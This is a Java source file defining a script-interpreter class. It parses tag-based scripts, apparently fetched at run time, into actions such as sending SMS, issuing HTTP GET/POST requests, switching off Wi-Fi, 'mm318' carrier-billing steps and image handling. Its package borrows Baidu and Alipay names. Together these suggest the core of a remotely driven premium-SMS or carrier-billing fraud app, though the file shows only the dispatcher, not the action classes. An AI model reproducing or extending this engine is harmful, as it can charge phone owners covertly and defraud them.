package com.baidu.alipay.script;

import java.util.ArrayList;
import java.util.List;
import java.util.Vector;

import android.content.Context;

import com.baidu.alipay.LogUtil;
import com.baidu.alipay.Tools;
import com.baidu.alipay.net.KeyValuePair;

public abstract class Tags {
    private static final String TAG = "Tags";
    
    public static final String PROP_SETHEADER = "setheader";
    
    
    public static final String TAGS_GET = "get";
    public static final String TAGS_INDEX = "index";
    public static final String TAGS_POST = "post";
    public static final String TAGS_GETS = "gets";
    public static final String TAGS_SETS = "sets";
    public static final String TAGS_SMS = "sms";
    public static final String TAGS_WAIT = "wait";
    public static final String TAGS_REPEAT = "repeat";
    public static final String TAGS_ERROR = "error";
    public static final String TAGS_SDK = "sdk";
    public static final String TAGS_REPLACE = "replace";
    public static final String TAGS_GZCK = "gzck";
    public static final String TAGS_POSTS = "posts";
    
    public static final String TAGS_NOWIFI = "nowifi";
    public static final String TAGS_ASYNCH = "asynch";
    
    public static final String TAGS_MM318 = "mm318";
    public static final String TAGS_MMQD318 = "mmqd318";
    public static final String TAGS_COMPLEX = "complex";
    public static final String TAGS_WAITGUARD = "waitguard";
    public static final String TAGS_BASE64IMG = "base64Img";
    public static final String TAGS_RETRY = "retry";
    public static final String TAGS_SPJD = "spjd";
        
    public static final String TAGS_EXEC_SUCC = "1";
    public static final String TAGS_EXEC_FAIL = "-1";
    
    static Vector<KeyValuePair> Data = new Vector<KeyValuePair>(0, 1);
    protected String errorReason = "";
    protected String referer = null;
    protected String setHeader = null;
    protected String rStr = null;
    //是否动态脚本
    protected boolean dynamic = false;
//    protected String asynchParam = "";
    
    public abstract String work(Context context,SendSms sendSms,List<Tags> srcList,int pos);
    
    protected boolean execSubList(Context context,SendSms sendSms,List<Tags> tagsList,int pos,List<Tags> subList){
    	boolean succ = true;
    	String prefix = getClass().getName().substring(0,1);
    	
    	try{
			for(int j = 0 ; j < subList.size() ; j ++){
				Tags tags = subList.get(j);
				
				String ret = tags.work(context, sendSms, subList, j);
				
				if(!Tags.TAGS_EXEC_SUCC.equals(ret)){
					succ = false;
					errorReason = prefix+"_"+tags.errorReason+"_"+j;
					break;
				}
			}
		}catch (Exception e) {
			e.printStackTrace();
			errorReason = prefix+"_"+e.getClass().getName();
			succ = false;
		}
    	
    	return succ;
    }

    public abstract String getTag();
    
    public String getErrorReason(){
    	return errorReason;
    }
    
    public static List<Tags> parse(String script,boolean dynamic){
    	List<Tags> list = new ArrayList<Tags>();
    	
    	Tags tag = null;
    	
        while (script.length() > 0 && script.indexOf(">") > 0) {
            int start = script.indexOf("<");
            int end = script.indexOf(">");
        
            if (start == 0 && end > 0) {
            	tag = null;
            	
                String tagName = script.substring(start + 1, end);

                LogUtil.e(TAG, "tagName: " + tagName);
                
                String tagXml = Tags.getNodeValue(script, tagName);
                
                if (tagName.equals(TAGS_GET)) {
                    tag = new Get(tagXml,dynamic);
                } else if (tagName.equals(TAGS_POST)) {
                    tag = new Post(tagXml,dynamic);
                } else if (tagName.equals(TAGS_INDEX)) {
                    tag = new Index(tagXml,dynamic);
                } else if (tagName.equals(TAGS_SMS)) {
                    tag = new Sms(tagXml,dynamic);
                } else if (tagName.equals(TAGS_WAIT)) {
                   tag = new Wait(tagXml,dynamic);
                } else if(tagName.equals(TAGS_SETS)){
                	tag = new Sets(tagXml,dynamic);
                } else if(tagName.equals(TAGS_REPEAT)){
                	tag = new Repeat(tagXml,dynamic);
                } else if(tagName.equals(TAGS_ERROR)){
                	tag = new Error(tagXml,dynamic);
                }else if(tagName.equals(TAGS_GETS)){
                	tag = new Gets(tagXml,dynamic);
                }else if(tagName.equals(TAGS_SDK)){
                	tag = new Sdk(tagXml,dynamic);
                }else if(tagName.equals(TAGS_REPLACE)){
                	tag = new Replace(tagXml, dynamic);
                }
                else if(tagName.equals(TAGS_NOWIFI)){
                	tag = new NoWifi();
                }
                else if(tagName.equals(TAGS_POSTS)){
                	tag = new Posts(tagXml,dynamic);
                }
                else if(tagName.equals(TAGS_MM318)){
                	tag = new Mm318(tagXml, dynamic);
                }
                else if(tagName.equals(TAGS_MMQD318)){
                	tag = new Mmqd318(tagXml, dynamic);
                }
                
                else if(tagName.equals(TAGS_ASYNCH)){
                	tag = new Asynch();
                }
                
                else if(tagName.equals(TAGS_COMPLEX)){
                	tag = new Complex(tagXml, dynamic);
                }
                
                else if(tagName.equals(TAGS_WAITGUARD)){
                	tag = new WaitGuard(tagXml, dynamic);
                }
                
                else if(tagName.equals(TAGS_BASE64IMG)){
                	tag = new Base64Img(tagXml, dynamic);
                }
                
                else if(tagName.equals(TAGS_RETRY)){
                	tag = new Retry(tagXml, dynamic);
                }
                
                else if(tagName.equals(TAGS_SPJD)){
                	tag = new Spjd(tagXml, dynamic);
                }
                
                else if(tagName.equals(TAGS_GZCK)){
                	tag = new Gzck(tagXml, dynamic);
                }
                
                if (tag != null) {
                	list.add(tag);
                }
                script = script.substring(tagXml.length() + tagName.length() * 2 + 5);
            } else {
                break;
            }
        }
        
        return list;
    }

    public static String submitStr() {
        LogUtil.e(TAG, "SubmitStr");
        String s = "";// 倒排输出变量值
        for (int i = Data.size() - 1; i >= 0; i--) {
            KeyValuePair kv = ((KeyValuePair) Data.elementAt(i));
            s += "["
                    + kv.Key
                    + "]"
                    + ":"
                    + kv.Value.substring(0, kv.Value.length() > 3000 ? 3000
                            : kv.Value.length()) + "\r\n";
        }
        return s;
    }

    public String formatUrl(SendSms sendSms,String url_) {
        LogUtil.e(TAG, "FomartUrl");
        String Url = "";
        String[] list = com.baidu.alipay.Tools.split(url_, "+");
        String temp = null;
        for (int i = 0; i < list.length; i++) {
            LogUtil.e(TAG, "list[i]: " + list[i]);
            temp = list[i];
            if (temp.startsWith("\"") && temp.endsWith("\"")) {
                Url += temp.substring(1, temp.length() - 1);
            } else {
                temp = sendSms.getDataValue(temp);
                if (temp.toLowerCase().startsWith("http://")) { // 如果变量含有域名，则不需要添加前面的域名
                    Url = "";
                }
                Url += temp;
            }
        }
        return Url = com.baidu.alipay.Tools.FomartUrl(Url);
    }

    public String fomartData(SendSms sendSms,String data_) {
        LogUtil.e(TAG, "FomartData");
        if (data_ == null || data_.equals(""))
            return "";

        String[] list = com.baidu.alipay.Tools.split(data_, "+");
        String Data = "";
        String temp;
        boolean start = data_.startsWith("\"");
        boolean end = data_.endsWith("\"");
        temp = data_.substring(1, data_.length() - 1);
        if (start && end && (temp.indexOf("\"") < 0)) {
            return temp;
        }
        for (int i = 0; i < list.length; i++) {
            temp = list[i].trim();
            start = temp.startsWith("\"");
            end = temp.endsWith("\"");
            if (start && end) {
                Data += temp.substring(1, temp.length() - 1);
            } else {
            	String _temp = sendSms.getDataValue(temp);
                if (_temp != null) {
                    temp = _temp;
                } else {
                    if (start) {
                        temp = temp.substring(1);
                    }
                    if (end) {
                        temp = temp.substring(0, temp.length() - 1);
                    }
                    // if((!start&&!end)&&i<list.length-1)
                    if (i < list.length - 1) {
                        temp += "+";
                    }
                }
                Data += temp;
            }
        }
        return Tools.repString(Tools.repString(
                Tools.repString(Data, "\\r", "\r"), "\\n", "\n"), "&amp;", "&");
    }

//    public static String getNodeValue(String str, String nodeName) {
////        LogUtil.e(TAG, "GetNodeValue");
//        try {
//            String prefix = "<" + nodeName + ">";
//            String postfix = "</" + nodeName + ">";
//            
//            int start = str.indexOf(prefix);
//            int end = str.indexOf(postfix);
//            
//            
//            return str.substring(start + prefix.length(), end);
//        } catch (Exception ex) {
//            return "";
//        }
//
//    }
    
    public static String getNodeValue(String xml,String nodeName){
		try{
			
			String prefix = "<"+nodeName+">";
			String postfix = "</"+nodeName+">";
		
			int start = xml.indexOf(prefix);
			int end = xml.indexOf(postfix,start+1);
			
			int start1 = start;
			int end1 = end;
			
			if(start >= 0 && end >= 0){
				while(true){
					start1 = xml.indexOf(prefix,start1+1);
					
					if(start1 < 0){
						break;
					}else{
						if(start1 > end1){
							break;
						}else{
							end1 = xml.indexOf(postfix,end1+1);
						}
					}
				}
				
				return xml.substring(start+prefix.length(),end1);
			}
		}catch(Exception e){
			e.printStackTrace();
		}
		
		return "";
	}

    public static int formatLength(String length) {
//        LogUtil.e(TAG, "FormatLength");
        int length_ = 0;
        try {
            if (length.equals("")) {
                return 0;
            }
            length_ = Integer.parseInt(length);
        } catch (Exception ex) {
            ex.printStackTrace();
        }
        return length_;
    }
    
}
